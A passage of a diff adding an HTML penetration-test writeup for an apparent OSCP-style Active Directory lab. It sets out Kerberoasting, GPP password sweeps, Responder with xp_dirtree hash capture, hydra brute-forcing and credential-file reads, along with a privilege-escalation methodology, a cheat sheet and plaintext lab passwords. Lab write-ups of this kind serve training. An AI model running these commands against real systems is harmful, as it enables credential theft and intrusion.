+<td>Delegated group membership</td>
+<td>none of our accounts is in <code>ADMIN</code>, <code>IT</code>, <code>FINANCE</code>, <code>HR</code>, <code>MARKETING</code>, <code>IIS_IUSRS</code></td>
+</tr>
+<tr>
+<td>LAPS</td>
+<td>not deployed — <code>haslaps=false</code> on all three computers</td>
+</tr>
+<tr>
+<td>Session theft / relay</td>
+<td><strong>no sessions observed</strong> on any computer</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3>6.3 The most important negative</h3>
+<p>The WinRM one deserves its own paragraph, because it is the reflex that would otherwise be tried
+first — it is what took MS01 in the previous leg.</p>
+<p><code>whoami /priv</code> on MS02 shows exactly five privileges: <code>SeShutdown</code>, <code>SeChangeNotify</code>, <code>SeUndock</code>,
+<code>SeIncreaseWorkingSet</code>, <code>SeTimeZone</code>. No <code>SeImpersonatePrivilege</code>.</p>
+<p>That alone is enough. But the stronger form of the argument is that the token <em>could not</em> have been an
+administrator's: UAC remote restrictions filter only <strong>local</strong> accounts, so a <strong>domain</strong> account in the
+machine's local <code>Administrators</code> group would receive a full privileged token over WinRM. Neither
+<code>BUILTIN\Administrators</code> nor the admin privilege set appears. Therefore <code>celia.almeda</code> is not a local
+administrator on MS02, and no privilege-escalation primitives exist in this token.</p>
+<hr />
+<h3>6.4 Two mechanical blockers</h3>
+<p>Both remaining actions are blocked by the same pair of host misconfigurations, not by anything in the
+target:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## 1. name resolution - Kerberos needs a name, not an IP</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.10.152.140 DC01.oscp.exam oscp.exam&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+
+<span class="c1">## 2. clock skew - Kerberos rejects &gt;5 minutes&#39; drift</span>
+sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span><span class="m">10</span>.10.152.140
+date<span class="w"> </span>-u
+</pre></div>
+<p>Until both are fixed, every roast fails with <code>KRB_AP_ERR_SKEW</code> and every collection silently degrades to
+NTLM — which is exactly what happened in chapter 04, and why the session data in chapter 05 is empty.</p>
+<hr />
+<h3>6.5 Status</h3>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>Address</th>
+<th>State</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MS02</td>
+<td><code>10.10.152.142</code></td>
+<td><strong>foothold</strong> — WinRM as <code>celia.almeda</code>, medium integrity</td>
+</tr>
+<tr>
+<td>DC01</td>
+<td><code>10.10.152.140</code></td>
+<td><strong>unowned</strong> — reachable, shares readable, no escalation</td>
+</tr>
+<tr>
+<td>MS01</td>
+<td>—</td>
+<td>known to the directory, address not captured in this leg</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Objective</th>
+<th>State</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Local admin on MS02</td>
+<td>not obtained</td>
+</tr>
+<tr>
+<td>SYSTEM on MS02</td>
+<td>not obtained</td>
+</tr>
+<tr>
+<td>Domain admin</td>
+<td>not obtained</td>
+</tr>
+<tr>
+<td><code>proof.txt</code></td>
+<td>not read</td>
+</tr>
+</tbody>
+</table>
+<p>The engagement is a credential problem now. Everything that could be done with the tokens in hand has
+been done and closed; what remains requires an account we do not have, and chapter 07 is where that
+account is expected to come from.</p></div></section>
+<section class="chapter" id="ch-07" data-title="Next actions"><div class="ch-head"><span class="ch-num">07</span><div class="ch-title"><h2>Next actions</h2><p class="ch-sub">Why <code>sql_svc</code>, and what runs next</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><blockquote>
+<p><strong>Not yet executed.</strong> Everything on this page is the plan that follows from chapters 01–06. No result
+is claimed here. When these run, this chapter is replaced with what actually happened.</p>
+</blockquote>
+<p>With every ACL path closed and every local token exhausted, the only lever left is a credential we do
+not have. Three independent lines of evidence name the same one.</p>
+<hr />
+<h3>7.1 Why <code>sql_svc</code></h3>
+<table>
+<thead>
+<tr>
+<th>Chapter</th>
+<th>What it establishes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>03 — MSSQL</td>
+<td><code>xp_cmdshell</code> runs as the <strong>SQL service account</strong>, so that security context is the escalation target</td>
+</tr>
+<tr>
+<td>04 — Domain recon</td>
+<td><code>sql_svc</code> holds <code>MSSQL/MS02.oscp.exam</code> and is <strong>Kerberoastable</strong></td>
+</tr>
+<tr>
+<td>05 — BloodHound</td>
+<td>it is the only account with an SPN <strong>and</strong> a four-year-old password, in a directory with no writable edges</td>
+</tr>
+</tbody>
+</table>
+<p><code>sql_svc</code> <em>is</em> the context <code>xp_cmdshell</code> would run in. A cracked <code>sql_svc</code> is therefore not just another
+domain user — it is an account whose privileges on MS02 are unknown and may include
+<code>SeImpersonatePrivilege</code>, which neither login we hold does. Its password has not changed since
+<strong>2022-12-05</strong>, on a service account, which is the profile that cracks.</p>
+<hr />
+<h3>7.2 Action 1 — Roast it</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerb.txt
+
+hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerb.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</pre></div>
+<p>Prerequisite: the hosts entry and clock sync from chapter 06.4. Without them this fails identically to
+chapter 04.</p>
+<p>If it cracks, the next test is whether <code>sql_svc</code> can log in over WinRM or SMB, and whether its token
+carries <code>SeImpersonate</code>:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;cracked&gt;&#39;</span>
+nxc<span class="w"> </span>smb<span class="w">   </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;cracked&gt;&#39;</span><span class="w"> </span>--shares
+</pre></div>
+<p><code>SeImpersonate</code> on that account, plus a service already running as it, is the SYSTEM path on MS02.</p>
+<hr />
+<h3>7.3 Action 2 — The share nobody has opened</h3>
+<p><code>Users</code> is not a default share on a domain controller, and <code>eric.wallows</code> can read it.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbclient<span class="w"> </span>//10.10.152.140/Users<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;oscp.exam%EricLikesRunning800&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; ls&#39;</span>
+</pre></div>
+<p>This is the highest-value <strong>unexamined</strong> surface in the engagement: a custom share holding user data,
+mounted on the DC, readable by a plain domain user. Scripts, config files and second credentials are the
+usual occupants.</p>
+<hr />
+<h3>7.4 Action 3 — GPP sweep</h3>
+<p>Cheap, and it fails closed:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span><span class="w"> </span>-M<span class="w"> </span>gpp_password
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span><span class="w"> </span>-M<span class="w"> </span>gpp_autologin
+</pre></div>
+<p>A <code>cpassword</code> in <code>SYSVOL</code> decrypts with a published key, so any hit is immediate plaintext.</p>
+<hr />
+<h3>7.5 Action 4 — Borrow the service account's hash</h3>
+<p>If the roast fails, <code>xp_dirtree</code> reaches the same account from a different direction — and it needs no
+privilege at all, because <code>public</code> can execute it:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-v
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\&lt;tun0-address&gt;\loot&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</pre></div>
+<p>The outbound authentication comes from the <strong>MSSQL service account</strong>, not from the SQL login that
+issued the query. Crack the NetNTLMv2 with <code>hashcat -m 5600</code>. Same target as 7.2, reached without
+Kerberos — which makes it the fallback of choice while DNS and the clock are still broken.</p>
+<hr />
+<h3>7.6 Action 5 — Re-collect once Kerberos works</h3>
+<p>The graph in chapter 05 came from an NTLM fallback with <strong>zero</strong> session results. A Kerberos-backed
+collection may expose sessions and local group memberships this run could not see:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-dc<span class="w"> </span>DC01.oscp.exam<span class="w"> </span>-c<span class="w"> </span>All
+</pre></div>
+<p>Treat the empty session table as <strong>"not observed"</strong>, not "proven absent", until this runs.</p>
+<hr />
+<h3>7.7 Order</h3>
+<ol>
+<li>hosts entry + <code>ntpdate</code> — nothing Kerberos-based works without it</li>
+<li>roast <code>sql_svc</code> — the convergence point</li>
+<li>open the <code>Users</code> share — the only unexamined surface</li>
+<li>GPP sweep — one command, immediate payoff if present</li>
+<li><code>xp_dirtree</code> capture — the Kerberos-free route to the same account</li>
+<li>re-collect BloodHound — to correct the "no sessions" reading</li>
+</ol>
+<p>Steps 2 and 5 attack the same account by different means, so a failure of one is not a failure of the
+other.</p>
+<hr />
+<h3>7.8 What this page will become</h3>
+<p>When the chain completes, this chapter is replaced by the escalation writeup, with the capture that
+proves the boundary was crossed — and the <code>proof.txt</code> value read in the same session as <code>whoami</code>,
+<code>hostname</code> and <code>ipconfig</code>, so the result is attributable rather than asserted.</p>
+<p>Until then, the honest statement is the one in chapter 06: <strong>MS02 is a foothold, DC01 is not owned, and
+the way in is a service account whose password has not changed since 2022.</strong></p></div></section>
+<section class="chapter" id="ch-08" data-title="Methodology"><div class="ch-head"><span class="ch-num">08</span><div class="ch-title"><h2>Methodology</h2><p class="ch-sub">The repeatable per-box loop</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The loop I run on every box, in order, with the rule that makes each step worth its time. This is
+deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only
+where evidence points.</p>
+<hr />
+<h3>Phase 0 — Setup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/&lt;box&gt;<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/&lt;box&gt;
+<span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span>&lt;ip&gt;
+</pre></div>
+<p>Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the
+report afterwards trivial and stops me confusing two boxes' output.</p>
+<hr />
+<h3>Phase 1 — Reachability and TCP</h3>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Command</th>
+<th>Rule</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ping</td>
+<td><code>ping -c 2 -W 2 $TARGET</code></td>
+<td>TTL tells you the OS before you scan (64 Linux, 128 Windows)</td>
+</tr>
+<tr>
+<td>Full TCP</td>
+<td><code>nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET</code></td>
+<td><strong>Always <code>-p-</code>.</strong> A top-1000 scan is a guess</td>
+</tr>
+<tr>
+<td>Versions</td>
+<td><code>nmap -sV -sC -p&lt;open&gt; -oN services.txt $TARGET</code></td>
+<td>Only the open ports; <code>-sC</code> is cheap and occasionally decisive</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Decision:</strong> for each open port, ask "what is the <em>configuration</em> weakness most likely to be, given
+this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.</p>
+<hr />
+<h3>Phase 2 — UDP (do not skip this)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$TARGET</span>
+</pre></div>
+<p>If <code>161/udp</code> is open:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+</pre></div>
+<p>Then, on success, always:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">   </span><span class="c1"># nsExtendTable — the money tree</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">   </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">   </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">     </span>#<span class="w"> </span>interface<span class="w"> </span>IPs
+</pre></div>
+<p><code>nsExtendTable</code> gives you the commands the agent runs plus the admin's own description of them.
+Descriptions are written for an internal audience and routinely name accounts and policies.</p>
+<hr />
+<h3>Phase 3 — Per-service enumeration</h3>
+<p>For each service, in the order that historically pays fastest.</p>
+<h4>HTTP/HTTPS</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
+<span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="k">done</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+</pre></div>
+<ul>
+<li>Note the <strong>404 body size</strong> — it is your filter for everything after.</li>
+<li>Vhosts: <code>ffuf -u http://$TARGET/ -H "Host: FUZZ" -w &lt;subdomains&gt; -fr "&lt;default page text&gt;"</code>.</li>
+<li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
+</ul>
+<h4>FTP</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
+</pre></div>
+<p>Try the account name as the password. Check for key material, configs, and backups in the data
+directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> account's secrets.</p>
+<h4>SSH</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>-i<span class="w"> </span>key<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span>id<span class="w">      </span><span class="c1"># never point a key at a host without -o BatchMode</span>
+ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
+</pre></div>
+<h4>SMB</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+</pre></div>
+<hr />
+<h3>Phase 4 — Foothold</h3>
+<p>Get a shell, then <strong>immediately</strong> stabilise and record identity:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+</pre></div>
+<p>Do not start hunting for privesc before you know exactly which uid and groups you hold — the
+escalation path depends on it.</p>
+<hr />
+<h3>Phase 5 — Local enumeration (Linux)</h3>
+<p>Send one script over one connection and read one report:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<p>Checklist, in the order that finds things:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>sudo rights</td>
+<td><code>sudo -n -l</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>SUID, excluding snap noise</td>
+<td><code>find / -perm -4000 -type f 2&gt;/dev/null \| grep -v '^/snap'</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Capabilities</td>
+<td><code>getcap -r / 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cron</td>
+<td><code>cat /etc/crontab; ls -la /etc/cron.*</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Writable service files</td>
+<td><code>find / -writable -type f -path '*/etc/*' 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Listening sockets</td>
+<td><code>ss -tlnp</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>Home directories</td>
+<td><code>ls -la /home/*</code> — this box had the SUID helper in a user's home</td>
+</tr>
+<tr>
+<td>8</td>
+<td>History and keys</td>
+<td><code>ls -la ~/.ssh; cat ~/.bash_history</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>Kernel</td>
+<td><code>uname -a</code> — only if 1–8 are empty</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Password reuse</td>
+<td>the foothold password against <code>sudo -S</code> and other users</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Rule:</strong> a <em>custom</em> SUID binary beats every generic exploit. Read it before reaching for
+<code>linpeas</code> output tables.</p>
+<hr />
+<h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+</pre></div>
+<p>What you are looking for, in priority order:</p>
+<ol>
+<li><code>system()</code> / <code>popen()</code> with a <strong>bare command name</strong> → <code>PATH</code> hijack (CWE-426)</li>
+<li><code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> that call → the shell will not drop privileges → full root</li>
+<li>A writable path used by root → symlink or overwrite attack</li>
+<li>A shell escape in a pager/editor it invokes</li>
+</ol>
+<p>If the binary is setuid <strong>and</strong> setgid, or lives in a user-writable directory, the box author is
+telling you this is the path.</p>
+<hr />
+<h3>Phase 7 — Post-exploitation and reporting</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/root/proof.txt<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/home/*/local.txt
+ip<span class="w"> </span>a<span class="p">;</span><span class="w"> </span>ip<span class="w"> </span>r<span class="w">          </span>#<span class="w"> </span>can<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>pivot?<span class="w"> </span><span class="o">(</span>single<span class="w"> </span>NIC<span class="w"> </span>+<span class="w"> </span>default<span class="w"> </span><span class="nv">route</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>no<span class="o">)</span>
+</pre></div>
+<p>Record: exact flags, the <code>id</code> output as root, the mechanism in one paragraph, and every command
+with its output. Then clean up.</p>
+<h4>Cleanup checklist</h4>
+<ul>
+<li>Remove every file you created, then <strong>verify</strong> with <code>ls</code>.</li>
+<li>Revert any file you modified.</li>
+<li>Do not change credentials you do not own; if an exploit would have (this box's <code>chpasswd</code>),
+  note that it did not run.</li>
+<li>Note in the report what you changed and what you left alone.</li>
+</ul>
+<hr />
+<h3>Timeboxing heuristics</h3>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>Budget</th>
+<th>Move on when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web on a stock default page</td>
+<td>10 min</td>
+<td>Two wordlists + vhosts agree there is nothing</td>
+</tr>
+<tr>
+<td>Version-CVE rabbit hole</td>
+<td>5 min</td>
+<td>The package revision shows the backport</td>
+</tr>
+<tr>
+<td>Credential guessing</td>
+<td>5 min per service</td>
+<td>Account-specific defaults exhausted</td>
+</tr>
+<tr>
+<td>Generic privesc sweep</td>
+<td>15 min</td>
+<td>A custom SUID/service/cron finding exists</td>
+</tr>
+</tbody>
+</table>
+<p>The recurring lesson: <strong>spend the time on the surface you have not looked at, not on the one you
+have already disproved.</strong> On this box, thirty UDP ports were worth more than an hour of web.</p></div></section>
+<section class="chapter" id="ch-09" data-title="Cheat sheet"><div class="ch-head"><span class="ch-num">09</span><div class="ch-title"><h2>Cheat sheet</h2><p class="ch-sub">Every command, with the flag that matters</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Only commands I have actually needed, with the small flag that matters each time.</p>
+<hr />
+<h3>Scanning</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## full TCP, fast — always -p-</span>
+nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-T4<span class="w"> </span>-oN<span class="w"> </span>full_tcp.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## versions + default scripts on the ports that matter</span>
+nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p21,22,80<span class="w"> </span>-oN<span class="w"> </span>services.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## UDP: the phase everyone skips</span>
+nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## live hosts</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
+</pre></div>
+<hr />
+<h3>SNMP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
